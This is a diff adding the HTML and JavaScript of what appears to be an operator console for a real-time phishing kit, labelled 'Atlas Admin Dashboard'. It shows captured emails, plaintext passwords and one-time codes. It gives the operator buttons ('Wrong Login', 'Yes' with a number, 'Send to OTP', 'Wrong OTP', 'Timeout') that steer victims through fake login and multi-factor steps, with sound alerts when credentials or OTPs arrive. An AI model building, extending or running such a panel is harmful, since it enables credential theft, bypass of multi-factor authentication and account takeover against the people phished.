@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Atlas Admin Dashboard</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+body { background: #f3f4f6; min-height: 100vh; }
+.navbar {
+  background: #fff; padding: 16px 24px;
+  display: flex; justify-content: space-between; align-items: center;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.05); flex-wrap: wrap; gap: 12px;
+}
+.navbar h1 { font-size: 20px; color: #1f2937; font-weight: 700; }
+.navbar-right { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+.sound-btn {
+  padding: 8px 16px; border-radius: 50px; border: none;
+  cursor: pointer; font-weight: 600; font-size: 13px;
+  background: #10b981; color: white;
+}
+.sound-btn.off { background: #ef4444; }
+.logout-btn {
+  padding: 8px 16px; border-radius: 50px; border: none;
+  background: #ef4444; color: white; cursor: pointer; font-weight: 600; font-size: 13px;
+}
+.container { max-width: 1400px; margin: 24px auto; padding: 0 20px; }
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 24px; }
+.stat-card { background: white; border-radius: 16px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+.stat-card h3 { font-size: 12px; color: #6b7280; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+.stat-card .num { font-size: 28px; font-weight: 700; color: #1f2937; }
+.table-wrap { background: white; border-radius: 20px; overflow-x: auto; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+table { width: 100%; border-collapse: collapse; min-width: 1200px; }
+th { text-align: left; padding: 14px 16px; background: #f9fafb; font-size: 12px; color: #6b7280; font-weight: 600; border-bottom: 1px solid #e5e7eb; text-transform: uppercase; }
+td { padding: 14px 16px; border-bottom: 1px solid #f3f4f6; font-size: 13px; color: #374151; vertical-align: middle; }
+tr:hover { background: #fafafa; }
+.badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+.badge-pending { background: #fef3c7; color: #d97706; }
+.badge-approved { background: #d1fae5; color: #059669; }
+.badge-otp { background: #e0e7ff; color: #4f46e5; }
+.badge-success { background: #d1fae5; color: #059669; }
+.actions { display: flex; flex-wrap: wrap; gap: 6px; }
+.btn {
+  padding: 6px 12px; border-radius: 8px; border: none;
+  cursor: pointer; font-size: 11px; font-weight: 600;
+  white-space: nowrap; transition: opacity 0.2s;
+}
+.btn:hover { opacity: 0.85; }
+.btn-wrong { background: #dc2626; color: white; }
+.btn-yes { background: #10b981; color: white; }
+.btn-text { background: #f97316; color: white; }
+.btn-timeout { background: #6b7280; color: white; }
+.btn-otp { background: #4f46e5; color: white; }
+.btn-success { background: #059669; color: white; }
+.btn-wrong-otp { background: #e11d48; color: white; }
+.btn-copy { background: #e5e7eb; color: #374151; padding: 4px 8px; font-size: 11px; }
+.modal-overlay {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.6);
+  z-index: 10000; display: none; justify-content: center; align-items: center; padding: 20px;
+}
+.modal-overlay.active { display: flex; }
+.modal {
+  background: white; border-radius: 20px; padding: 32px;
+  max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+}
+.modal h3 { color: #1f2937; margin-bottom: 16px; font-size: 18px; }
+.modal input, .modal textarea {
+  width: 100%; padding: 12px;
+  border: 1.5px solid #e5e7eb; border-radius: 10px;
+  font-size: 15px; margin-bottom: 16px; outline: none; font-family: inherit;
+}
+.modal input:focus, .modal textarea:focus { border-color: #4a4ff0; }
+.modal textarea { min-height: 100px; resize: vertical; }
+.modal-buttons { display: flex; gap: 10px; }
+.modal-buttons button {
+  flex: 1; padding: 12px; border-radius: 10px; border: none;
+  font-weight: 600; cursor: pointer; font-size: 14px;
+}
+.modal-buttons .confirm { background: #4a4ff0; color: white; }
+.modal-buttons .cancel { background: #e5e7eb; color: #374151; }
+</style>
+</head>
+<body>
+
+<div class="navbar">
+  <h1>Admin Dashboard</h1>
+  <div class="navbar-right">
+    <button id="soundBtn" class="sound-btn off">🔇 Sound Off</button>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+  </div>
+</div>
+
+<div class="container">
+  <div class="stats">
+    <div class="stat-card"><h3>Total Users</h3><div class="num" id="statTotal">0</div></div>
+    <div class="stat-card"><h3>Pending</h3><div class="num" id="statPending">0</div></div>
+    <div class="stat-card"><h3>OTP Submitted</h3><div class="num" id="statOtp">0</div></div>
+    <div class="stat-card"><h3>Success</h3><div class="num" id="statSuccess">0</div></div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Email</th>
+          <th>Password</th>
+          <th>OTP</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="usersTable"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- Yes Modal -->
+<div id="yesModal" class="modal-overlay">
+  <div class="modal">
+    <h3>Yes Button — Enter Number</h3>
+    <input type="number" id="yesNumberInput" placeholder="Enter number (e.g. 33)" min="0">
+    <div class="modal-buttons">
+      <button class="cancel" onclick="closeModal('yesModal')">Cancel</button>
+      <button class="confirm" onclick="confirmYes()">Send</button>
+    </div>
+  </div>
+</div>
+
+<!-- Text Modal -->
+<div id="textModal" class="modal-overlay">
+  <div class="modal">
+    <h3>Text Message</h3>
+    <textarea id="textInput" placeholder="Type message for user..."></textarea>
+    <div class="modal-buttons">
+      <button class="cancel" onclick="closeModal('textModal')">Cancel</button>
+      <button class="confirm" onclick="confirmText()">Send</button>
+    </div>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const token = localStorage.getItem('adminToken');
+if (!token) window.location.href = '/admin';
+
+const socket = io();
+let users = [];
+let selectedEmailForYes = null;
+let selectedEmailForText = null;
+let audioCtx = null;
+let soundEnabled = false;
+
+// ============ WEB AUDIO TONES ============
+function getAudioCtx() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  return audioCtx;
+}
+
+function playTone(frequencies, durations) {
+  if (!soundEnabled) return;
+  try {
+    const ctx = getAudioCtx();
+    let time = ctx.currentTime;
+    frequencies.forEach((freq, i) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = 'sine';
+      osc.frequency.value = freq;
+      gain.gain.setValueAtTime(0.001, time);
+      gain.gain.exponentialRampToValueAtTime(0.3, time + 0.01);
+      gain.gain.exponentialRampToValueAtTime(0.001, time + durations[i]);
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start(time);
+      osc.stop(time + durations[i]);
+      time += durations[i];
+    });
+  } catch (e) { console.log('Audio error:', e); }
+}
+
+function playEmailTone() { playTone([880, 1100], [0.15, 0.15]); }
+function playOtpTone() { playTone([660, 880, 1100], [0.12, 0.12, 0.18]); }
+
+// ============ SOUND TOGGLE ============
+document.getElementById('soundBtn').addEventListener('click', () => {
+  soundEnabled = !soundEnabled;
+  const btn = document.getElementById('soundBtn');
+  if (soundEnabled) {
+    btn.classList.remove('off');
+    btn.textContent = '🔊 Sound On';
+    playEmailTone();
+  } else {
+    btn.classList.add('off');
+    btn.textContent = '🔇 Sound Off';
+  }
+});
+
+// ============ LOAD USERS ============
+async function loadUsers() {
+  try {
+    const res = await fetch('/api/admin/users', {
+      headers: { 'Authorization': `Bearer ${token}` }
+    });
+    if (res.status === 401 || res.status === 403) {
+      localStorage.removeItem('adminToken');
+      window.location.href = '/admin';
+      return;
+    }
+    users = await res.json();
+    renderTable();
+    updateStats();
+  } catch (e) { console.error(e); }
+}
+
+function updateStats() {
+  document.getElementById('statTotal').textContent = users.length;
+  document.getElementById('statPending').textContent = users.filter(u => u.status === 'pending').length;
+  document.getElementById('statOtp').textContent = users.filter(u => u.status === 'otp_submitted').length;
+  document.getElementById('statSuccess').textContent = users.filter(u => u.status === 'success').length;
+}
+
+function renderTable() {
+  const tbody = document.getElementById('usersTable');
+  if (!users.length) {
+    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:40px;color:#9ca3af;">No users yet</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = users.map(u => {
+    let statusBadge = '';
+    if (u.status === 'pending') statusBadge = '<span class="badge badge-pending">Pending</span>';
+    else if (u.status === 'approved') statusBadge = '<span class="badge badge-approved">Approved</span>';
+    else if (u.status === 'otp_submitted') statusBadge = '<span class="badge badge-otp">OTP Submitted</span>';
+    else if (u.status === 'success') statusBadge = '<span class="badge badge-success">Success</span>';
+
+    // Show buttons based on status
+    let actions = '';
+    if (u.status === 'pending') {
+      actions = `
+        <button class="btn btn-wrong" onclick="wrongLogin('${u.email}')">Wrong Login</button>
+        <button class="btn btn-yes" onclick="openYes('${u.email}')">Yes</button>
+        <button class="btn btn-text" onclick="openText('${u.email}')">Text</button>
+        <button class="btn btn-timeout" onclick="timeoutUser('${u.email}')">Timeout</button>
+        <button class="btn btn-otp" onclick="sendToOtp('${u.email}')">Send to OTP</button>
+        <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
+      `;
+    } else if (u.status === 'otp_submitted') {
+      actions = `
+        <button class="btn btn-wrong-otp" onclick="wrongOtp('${u.email}')">Wrong OTP</button>
+        <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
+      `;
+    } else if (u.status === 'approved') {
+      actions = `
+        <button class="btn btn-wrong-otp" onclick="wrongOtp('${u.email}')">Wrong OTP</button>
+        <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
+      `;
+    } else if (u.status === 'success') {
+      actions = '<span style="color:#9ca3af;font-size:12px;">Completed</span>';
+    }
+
+    return `<tr>
+      <td>${u.id}</td>
+      <td>${escapeHtml(u.email)} <button class="btn btn-copy" onclick="copyText('${escapeHtml(u.email)}')">Copy</button></td>
+      <td>${escapeHtml(u.password || '-')}</td>
+      <td>${u.otp ? escapeHtml(u.otp) + ' <button class="btn btn-copy" onclick="copyText(\'' + escapeHtml(u.otp) + '\')">Copy</button>' : '-'}</td>
+      <td>${statusBadge}</td>
+      <td><div class="actions">${actions}</div></td>
+    </tr>`;
+  }).join('');
+}
+
+function escapeHtml(s) {
+  if (!s) return '';
+  return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+}
+
+function copyText(text) {
+  navigator.clipboard.writeText(text);
+}
+
+// ============ ACTIONS ============
+async function post(path, body) {
+  const res = await fetch(path, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+    body: JSON.stringify(body)
+  });
+  return res.json();
+}
+
+async function wrongLogin(email) {
+  await post('/api/admin/wrong-login', { email });
+  loadUsers();
+}
+
+async function timeoutUser(email) {
+  await post('/api/admin/timeout', { email });
+  loadUsers();
+}
+
+async function sendToOtp(email) {
+  await post('/api/admin/send-to-otp', { email });
+  loadUsers();
+}
+
+async function wrongOtp(email) {
+  await post('/api/admin/wrong-otp', { email });
+  loadUsers();
+}
+
+async function markSuccess(email) {
+  await post('/api/admin/success', { email });
+  loadUsers();
+}
+
+// YES Modal
+function openYes(email) {
+  selectedEmailForYes = email;
+  document.getElementById('yesNumberInput').value = '';
+  document.getElementById('yesModal').classList.add('active');
+  setTimeout(() => document.getElementById('yesNumberInput').focus(), 100);
+}
+
+async function confirmYes() {
+  const num = document.getElementById('yesNumberInput').value.trim();
+  if (!num) { alert('Please enter a number'); return; }
+  await post('/api/admin/yes', { email: selectedEmailForYes, number: num });
+  closeModal('yesModal');
+  loadUsers();
+}
+
+// TEXT Modal
+function openText(email) {
+  selectedEmailForText = email;
+  document.getElementById('textInput').value = '';
+  document.getElementById('textModal').classList.add('active');
+  setTimeout(() => document.getElementById('textInput').focus(), 100);
+}
+
+async function confirmText() {
+  const txt = document.getElementById('textInput').value.trim();
+  if (!txt) { alert('Please enter a message'); return; }
+  await post('/api/admin/text', { email: selectedEmailForText, text: txt });
+  closeModal('textModal');
+  loadUsers();
+}
+
+function closeModal(id) {
+  document.getElementById(id).classList.remove('active');
+}
+
+function logout() {
+  localStorage.removeItem('adminToken');
+  window.location.href = '/admin';
+}
+
+// ============ SOCKET EVENTS ============
+socket.on('user-login', () => { playEmailTone(); loadUsers(); });
+socket.on('user-otp', () => { playOtpTone(); loadUsers(); });
+socket.on('user-updated', () => loadUsers());
+
+// Initial load + polling fallback
+loadUsers();
+setInterval(loadUsers, 5000);
+</script>
+</body>
+</html>
